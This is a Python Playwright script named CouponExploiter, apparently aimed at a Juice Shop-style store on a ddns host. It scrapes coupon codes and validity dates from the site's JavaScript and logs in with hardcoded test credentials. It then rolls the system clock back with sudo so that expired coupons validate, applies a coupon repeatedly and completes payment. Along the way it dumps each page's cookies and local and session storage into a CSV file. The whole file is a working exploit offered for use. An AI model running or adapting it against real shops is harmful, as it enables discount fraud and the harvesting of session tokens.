import json
import time
import random
import re
import requests
import subprocess
import os
import pandas as pd
from datetime import datetime
from playwright.sync_api import sync_playwright, Locator
from bs4 import BeautifulSoup
import logging

logging.basicConfig(
    filename='automation_interactions.log',
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

def log_print(msg):
    print(msg)
    logging.info(msg)

class CouponExploiter:
    def __init__(self, base_url, output_csv="automation_log.csv"):
        self.base_url = base_url.rstrip("/")
        self.output_csv = output_csv
        self.dataset = []
        self.logged_in = False
        self.coupon_codes = {}

    def log_entry(self,
                  page=None,
                  action="",
                  details="",
                  element_label="",
                  selector="",
                  input_value="",
                  nature="0"):
        url = ""
        session_data = ""
        local_data = ""
        cookies = ""
        if page:
            url = page.url
            # Attempt to retrieve session/local/cookies
            try:
                session_data_dict = page.evaluate("""() => {
                    let s = {};
                    for(let i = 0; i < sessionStorage.length; i++){
                        let k = sessionStorage.key(i);
                        s[k] = sessionStorage.getItem(k);
                    }
                    return s;
                }""")
                session_data = json.dumps(session_data_dict)
            except Exception as e:
                log_print(f"[⚠️] Error retrieving sessionStorage: {e}")

            try:
                local_data_dict = page.evaluate("""() => {
                    let s = {};
                    for(let i = 0; i < localStorage.length; i++){
                        let k = localStorage.key(i);
                        s[k] = localStorage.getItem(k);
                    }
                    return s;
                }""")
                local_data = json.dumps(local_data_dict)
            except Exception as e:
                log_print(f"[⚠️] Error retrieving localStorage: {e}")

            try:
                cookies_list = page.context.cookies()
                cookies = json.dumps(cookies_list)
            except Exception as e:
                log_print(f"[⚠️] Error retrieving cookies: {e}")

        row = {
            "timestamp": time.time(),
            "url": url,
            "action": action,
            "details": details,
            "element_label": element_label,
            "selector": selector,
            "input_value": input_value,
            "nature": nature,
            "session_data": session_data,
            "local_storage": local_data,
            "cookies": cookies
        }
        self.dataset.append(row)

    def log_action(self, page, action, locator: Locator, input_value=None, nature="0"):
        try:
            element_handle = locator.element_handle()
            if not element_handle:
                log_print(f"[⚠️] Could not retrieve element handle for action '{action}'.")
                self.log_entry(page, action, "", "", "", input_value or "", nature)
                return

            selector = element_handle.evaluate(
                """el => el.tagName.toLowerCase() 
                      + (el.id ? '#' + el.id : '') 
                      + (el.className ? '.' + el.className.split(' ').join('.') : '')"""
            )
            label = element_handle.evaluate(
                """el => el.getAttribute('name')
                    || el.getAttribute('placeholder')
                    || el.getAttribute('title')
                    || el.getAttribute('aria-label')
                    || el.innerText.trim()
                    || 'Unnamed Element'"""
            )
            log_print(f"[📝] {action}: {label} ({selector}) on {page.url}")

            self.log_entry(
                page=page,
                action=action,
                details="",
                element_label=label,
                selector=selector,
                input_value=(input_value or ""),
                nature=nature
            )
        except Exception as e:
            log_print(f"[⚠️] Error logging action: {e}")

    def log_step(self, page, action, details=""):
        log_print(f"[STEP] {action}: {details}")
        self.log_entry(page, action, details, "", "", "", "0")

    def save_dataset(self):
        if self.dataset:
            df = pd.DataFrame(self.dataset)
            df.to_csv(self.output_csv, index=False)
            log_print(f"[📊] Dataset saved to {self.output_csv}")

    def set_system_date(self, new_timestamp):
        dt = datetime.fromtimestamp(new_timestamp / 1000)
        date_str = dt.strftime("%Y-%m-%d %H:%M:%S")
        log_print(f"[⏰] Setting system date/time to: {date_str}")
        try:
            if os.name == 'posix':
                subprocess.run(["sudo", "date", "-s", date_str], check=True)
            elif os.name == 'nt':
                date_part = dt.strftime("%d-%m-%Y")
                time_part = dt.strftime("%H:%M:%S")
                subprocess.run(["date", date_part], shell=True, check=True)
                subprocess.run(["time", time_part], shell=True, check=True)
            else:
                log_print("[⚠️] Unsupported OS for changing system date.")
        except Exception as e:
            log_print(f"[⚠️] Failed to set system date/time: {e}")

    def perform_login(self, page):
        log_print("[🔑] Navigating to login page...")
        page.goto(f"{self.base_url}/#/login", wait_until="domcontentloaded")
        time.sleep(2)

        email_selector = 'input[name="email"]'
        page.fill(email_selector, "test@gmail.com")
        self.log_action(page, "Input", page.locator(email_selector), input_value="test@gmail.com")

        password_selector = 'input[name="password"]'
        page.fill(password_selector, "test123")
        self.log_action(page, "Input", page.locator(password_selector), input_value="test123")

        login_button_selector = 'button[type="submit"]'
        page.click(login_button_selector)
        self.log_action(page, "Click", page.locator(login_button_selector))
        time.sleep(3)

        auth_token = page.evaluate("() => window.localStorage.getItem('token') || window.sessionStorage.getItem('token')")
        if auth_token:
            log_print("[✅] Login successful!")
            self.logged_in = True
            self.log_step(page, "Login", "Login successful, token present.")
        else:
            log_print("[❌] Login failed. Check credentials.")

    def perform_add_to_cart(self, page):
        log_print("[🛒] Attempting to add product to cart...")
        try:
            add_buttons = page.locator('button[aria-label="Add to Basket"]')
            if add_buttons.count() > 0:
                add_buttons.first.click()
                self.log_action(page, "Click", add_buttons.first)
                time.sleep(2)
                log_print("[✅] Product added to cart!")
                self.log_step(page, "AddToCart", "Product added to cart.")
            else:
                log_print("[⚠️] 'Add to Basket' button not found.")
        except Exception as e:
            log_print(f"[⚠️] Error adding product: {e}")

    def navigate_checkout_flow(self, page):
        try:
            basket_url = f"{self.base_url}/#/basket"
            log_print(f"[🛍️] Navigating to basket: {basket_url}")
            self.log_step(page, "NavigateBasket", f"Navigating to basket page: {basket_url}")
            page.goto(basket_url, wait_until="domcontentloaded")
            time.sleep(2)
            page.evaluate("document.querySelectorAll('.cdk-overlay-backdrop').forEach(e => e.remove());")
            time.sleep(0.5)

            checkout_button = page.locator('#checkoutButton')
            if checkout_button.count() == 0:
                checkout_button = page.locator('.checkout-button')
            if checkout_button.count() > 0 and checkout_button.is_visible():
                log_print("[✅] Checkout button found. Clicking...")
                self.log_step(page, "ClickCheckout", "Clicked checkout button.")
                checkout_button.first.click(force=True)
                time.sleep(2)
            else:
                log_print("[❌] Checkout button not found.")
                return False

            address_url = f"{self.base_url}/#/address/select"
            log_print(f"[🗺️] Navigating to address selection: {address_url}")
            self.log_step(page, "NavigateAddress", f"Navigating to address selection page: {address_url}")
            page.goto(address_url, wait_until="domcontentloaded")
            time.sleep(2)

            address_radio = page.locator("mat-radio-button")
            if address_radio.count() > 0:
                log_print("[✅] Address radio button found. Selecting...")
                self.log_step(page, "SelectAddress", "Selected first address radio button.")
                address_radio.first.click(force=True)
                time.sleep(1)
            else:
                log_print("[❌] Address radio button not found.")
                return False

            next_button = page.locator('button:has-text("Continue")')
            if next_button.count() > 0:
                next_button.first.click(force=True)
                self.log_step(page, "AddressNext", "Clicked Next on address selection.")
                time.sleep(2)
            else:
                log_print("[❌] Next button on address page not found.")
                return False

            delivery_url = f"{self.base_url}/#/delivery-method"
            log_print(f"[🚚] Navigating to delivery method page: {delivery_url}")
            self.log_step(page, "NavigateDelivery", f"Navigating to delivery method page: {delivery_url}")
            page.goto(delivery_url, wait_until="domcontentloaded")
            time.sleep(2)

            delivery_radio = page.locator("mat-radio-button")
            if delivery_radio.count() > 0:
                log_print("[✅] Delivery method radio button found. Selecting...")
                self.log_step(page, "SelectDelivery", "Selected first delivery radio button.")
                delivery_radio.first.click(force=True)
                time.sleep(1)
            else:
                log_print("[❌] Delivery method radio button not found.")
                return False

            next_button = page.locator('button:has-text("Proceed")')
            if next_button.count() > 0:
                next_button.first.click(force=True)
                self.log_step(page, "DeliveryNext", "Clicked Next on delivery method page.")
                time.sleep(2)
            else:
                log_print("[❌] Next button on delivery method page not found.")
                return False

            payment_url = f"{self.base_url}/#/payment/shop"
            log_print(f"[💳] Navigating to Payment page: {payment_url}")
            self.log_step(page, "NavigatePayment", f"Navigating to payment page: {payment_url}")
            page.goto(payment_url, wait_until="domcontentloaded")
            time.sleep(2)

            self.expand_coupon_section(page)
            self.log_step(page, "CouponForm", "Coupon input form is visible.")
            log_print("[+] Checkout flow reached coupon input form.")
            return True
        except Exception as e:
            log_print(f"[❌] Checkout flow failed: {e}")
            return False

    def expand_coupon_section(self, page):
        try:
            coupon_expander = page.locator('mat-expansion-panel#collapseCouponElement mat-expansion-panel-header')
            if coupon_expander.count() > 0:
                log_print("[✅] Found coupon panel header. Expanding...")
                coupon_expander.first.click(force=True)
                time.sleep(1)
            else:
                log_print("[⚠️] Coupon panel header not found.")
        except Exception as e:
            log_print(f"[⚠️] Error expanding coupon section: {e}")

    def wait_for_coupon_input(self, page, timeout=10000):
        try:
            page.wait_for_selector('input#coupon', timeout=timeout)
            log_print("[✅] Found coupon input field with id 'coupon'.")
            return page.locator('input#coupon')
        except Exception as e:
            log_print(f"[⚠️] Coupon input not found by id 'coupon': {e}")

        try:
            alt_selector = 'mat-expansion-panel#collapseCouponElement input[type="text"]'
            page.wait_for_selector(alt_selector, timeout=timeout)
            log_print(f"[✅] Found coupon input using selector: {alt_selector}")
            return page.locator(alt_selector)
        except Exception as e:
            log_print(f"[⚠️] Coupon input not found using selector {alt_selector}: {e}")

        raise Exception("Coupon input field not found.")

    def exploit_expired_coupon(self, page):
        if not self.coupon_codes:
            log_print("[⚠️] No coupon codes discovered; skipping coupon exploitation.")
            return

        for coupon_code, data in self.coupon_codes.items():
            try:
                log_print(f"\n[+] Attempting coupon code: {coupon_code} (validOn={data['validOn']}, discount={data['discount']})")
                self.log_step(page, "CouponAttempt", f"Trying coupon: {coupon_code}")

                # 1) Set system date/time
                self.set_system_date(1551999600000)
                time.sleep(2)

                # 2) Return to basket & re-run entire checkout
                basket_url = f"{self.base_url}/#/basket"
                log_print("[🔄] Returning to basket to restart checkout process.")
                self.log_step(page, "RestartCheckout", "Navigating back to basket after date change.")
                page.goto(basket_url, wait_until="domcontentloaded")
                time.sleep(2)
                if not self.navigate_checkout_flow(page):
                    log_print("[⚠️] Failed to navigate checkout flow after date change.")
                    continue

                # 3) Payment method
                payment_option_radio = page.locator("mat-radio-button")
                if payment_option_radio.count() > 0:
                    log_print("[+] Selecting a payment option radio button...")
                    self.log_step(page, "SelectPayment", "Selecting first payment method radio button.")
                    payment_option_radio.first.click(force=True)
                    time.sleep(1)
                else:
                    log_print("[!] Payment radio button not found! Proceeding anyway...")

                # 4 & 5) Repeat input & apply 5 times
                for attempt in range(7):
                    log_print(f"[🔁] Attempt {attempt+1}: Inputting and applying coupon {coupon_code}.")
                    coupon_input = self.wait_for_coupon_input(page, timeout=10000)
                    coupon_input.fill("")
                    self.log_action(page, "Input", coupon_input, input_value=f"{coupon_code} (attempt {attempt+1})")
                    coupon_input.fill(coupon_code)

                    apply_button = page.locator('button[id="applyCouponButton"]')
                    apply_button.click()
                    self.log_action(page, "Click", apply_button)
                    time.sleep(2)

                # 6) Check coupon result
                try:
                    error_element = page.locator('.error[role="alert"]')
                    error_text = error_element.inner_text(timeout=3000)
                    if "Invalid Coupon" in error_text:
                        log_print(f"[❌] Coupon {coupon_code} is still invalid after repeated attempts.")
                        self.log_step(page, "CouponResult", f"Coupon {coupon_code} invalid: {error_text}")
                    else:
                        log_print(f"[✅] Coupon {coupon_code} appears accepted after repeated attempts.")
                        self.log_step(page, "CouponResult", f"Coupon {coupon_code} accepted.")
                except Exception:
                    log_print(f"[✅] Coupon {coupon_code} applied without error.")
                    self.log_step(page, "CouponResult", f"Coupon {coupon_code} applied with no error.")

                # 7) "Continue" button
                continue_btn = page.locator('button:has-text("Payment")')
                if continue_btn.count() > 0:
                    log_print("[+] Clicking 'Continue' button (Step 7).")
                    self.log_step(page, "CompleteCheckout", "Clicked the 'Continue' button.")
                    continue_btn.first.click(force=True)
                    time.sleep(2)
                else:
                    log_print("[!] 'Continue' button not found in Step 7.")

                # 8) "Pay" button
                pay_button = page.locator('button:has-text("Pay")')
                if pay_button.count() > 0:
                    log_print("[+] Clicking final 'Pay' button (Step 8).")
                    self.log_step(page, "ClickPaymentButton", "Clicked the final 'Pay' button.")
                    pay_button.first.click(force=True)
                    time.sleep(2)
                else:
                    log_print("[!] 'Pay' button not found in Step 8!")

            except Exception as e:
                log_print(f"[⚠️] Failed to apply coupon {coupon_code}: {e}")

    def discover_coupon_codes(self):
        self.log_step(None, "DiscoverCoupons", "Starting coupon code discovery")
        try:
            resp = requests.get(self.base_url, timeout=10)
            if resp.status_code != 200:
                log_print(f"[⚠️] Could not retrieve base page: HTTP {resp.status_code}")
                return
            scripts = re.findall(r'<script.*?src="([^"]+)".*?>', resp.text)
            if not scripts:
                log_print("[⚠️] No <script> tags found on base page.")
                return

            found_campaigns = False
            for script_url in scripts:
                if not script_url.endswith(".js"):
                    continue
                if script_url.startswith("/"):
                    script_url = self.base_url + script_url
                elif not script_url.startswith("http"):
                    script_url = f"{self.base_url}/{script_url}"
                if self.parse_campaigns_in_js(script_url):
                    found_campaigns = True
                    break

            if found_campaigns:
                log_print(f"[✅] Discovered coupon codes: {self.coupon_codes}")
                self.log_step(None, "DiscoverCoupons", f"Coupons found: {self.coupon_codes}")
            else:
                log_print("[⚠️] No coupon codes discovered in JS files.")
        except requests.RequestException as e:
            log_print(f"[⚠️] Error connecting to {self.base_url}: {e}")

    def parse_campaigns_in_js(self, js_url):
        try:
            r = requests.get(js_url, timeout=10)
            if r.status_code != 200:
                return False
            match = re.search(
                r"(this\.[a-zA-Z0-9_]*\s*=\s*\{(.*?)(discount|campaign).*?\})",
                r.text,
                re.DOTALL | re.IGNORECASE
            )
            if not match:
                return False
            block = match.group(0)
            pattern = r"([A-Z0-9]+)\s*:\s*\{\s*[^}]*discount\s*:\s*(\d+)[^}]*validOn\s*:\s*([\d.eE]+)"
            pattern_alt = r"([A-Z0-9]+)\s*:\s*\{\s*[^}]*validOn\s*:\s*([\d.eE]+)[^}]*discount\s*:\s*(\d+)"
            found = re.findall(pattern, block, re.DOTALL | re.IGNORECASE)
            if not found:
                found = re.findall(pattern_alt, block, re.DOTALL | re.IGNORECASE)
                found = [(code, disc, valid) for (code, valid, disc) in found]
            for code, discount, valid_on in found:
                try:
                    numeric_valid_on = float(valid_on)
                    self.coupon_codes[code] = {"validOn": numeric_valid_on, "discount": int(discount)}
                except ValueError:
                    pass
            return bool(self.coupon_codes)
        except requests.RequestException:
            return False

    def run(self):
        self.discover_coupon_codes()
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)
            page = browser.new_page()
            log_print(f"[🌐] Navigating to base page: {self.base_url}")
            page.goto(self.base_url, wait_until="domcontentloaded")
            time.sleep(2)

            self.perform_login(page)
            self.perform_add_to_cart(page)

            if self.navigate_checkout_flow(page):
                self.exploit_expired_coupon(page)
            else:
                log_print("[⚠️] Checkout flow incomplete. Coupon exploitation aborted.")

            browser.close()
        self.save_dataset()

if __name__ == "__main__":
    exploiter = CouponExploiter(
        base_url="https://slaying.ddns.net",
        output_csv="automation_log.csv"
    )
    exploiter.run()
